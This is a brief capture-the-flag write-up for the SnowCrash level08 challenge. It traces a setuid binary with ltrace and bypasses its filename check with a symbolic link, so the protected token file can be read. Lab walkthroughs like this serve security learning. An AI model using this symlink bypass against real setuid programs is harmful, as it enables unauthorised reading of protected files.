# Snowcrash08

More stuff in home, ok

```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

This time we have a binary and a token which we may not access.

The binary wants a file to read, but won't take the token

```bash
level08@SnowCrash:~$ ltrace ./level08 token 
strstr("token", "token")= "token"
printf("You may not access '%s'\n", "token" )= 27 You may not access 'token'
+++ exited (status 1) +++
```
strstr is looking for the token name, how about something else ?


```bash
level08@SnowCrash:~$ ltrace ./level08 tokea
strstr("tokea", "token")= NULL
open("tokea", 0, 014435162522)= -1
err(1, 0x80487b2, 0xbffff911, 0xb7fe765d, 0xb7e3ebaflevel08: Unable to open tokea: No such file or directory
+++ exited (status 1) +++
```
Ok so it tries to open it as long as his name is not token, we cannot copy it with another name, but we can make a link to it

```bash
ln -s -f $(pwd)/token /tmp/kekw && ./level08 /tmp/kekw
```
This time we do need to get into the flag account